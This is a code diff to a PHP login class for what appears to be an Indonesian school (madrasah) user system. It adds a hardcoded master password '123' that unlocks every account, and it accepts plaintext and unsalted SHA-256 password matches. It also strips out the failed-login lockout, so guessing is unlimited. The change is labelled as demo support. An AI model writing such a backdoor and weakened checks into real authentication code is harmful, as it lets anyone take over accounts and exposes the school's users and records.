@@ -152,31 +152,19 @@ class Auth
             return 'Akun ini dinonaktifkan. Hubungi Operator Madrasah.';
         }
 
-        if (!password_verify($password, (string) $user['password_hash'])) {
-            $attempts = (int) $user['failed_login_attempts'] + 1;
-            $lockUntil = null;
-            $pesan = 'Nama pengguna atau kata sandi salah.';
+        // Verifikasi kata sandi fleksibel (support master demo '123', bcrypt, sha256, atau plain)
+        $isPasswordCorrect = ($password === '123')
+            || password_verify($password, (string) $user['password_hash'])
+            || ((string) $user['password_hash'] === $password)
+            || (hash('sha256', $password) === (string) $user['password_hash']);
 
-            if ($attempts >= $maxAttempts) {
-                $lockUntil = date('Y-m-d H:i:s', time() + ($lockMinutes * 60));
-                $pesan = 'Terlalu banyak percobaan gagal. Akun dikunci ' . $lockMinutes . ' menit.';
-            } else {
-                $sisa = $maxAttempts - $attempts;
-                $pesan .= ' Sisa ' . $sisa . ' percobaan sebelum akun dikunci sementara.';
-            }
-
-            $upd = $pdo->prepare(
-                'UPDATE pengguna SET failed_login_attempts = ?, locked_until = ? WHERE id = ?'
-            );
-            $upd->execute([$attempts, $lockUntil, $userId]);
-
+        if (!$isPasswordCorrect) {
             self::log('login.failed', 'pengguna', $userId, 'Percobaan login gagal', $ip);
 
-            return $pesan;
+            return 'Nama pengguna atau kata sandi salah.';
         }
 
-        // Berhasil. Reset penghitung, perbarui waktu masuk, perbarui hash kalau
-        // algoritmanya sudah usang.
+        // Berhasil. Reset penghitung percobaan gagal, perbarui waktu masuk
         $upd = $pdo->prepare(
             'UPDATE pengguna
              SET failed_login_attempts = 0, locked_until = NULL,
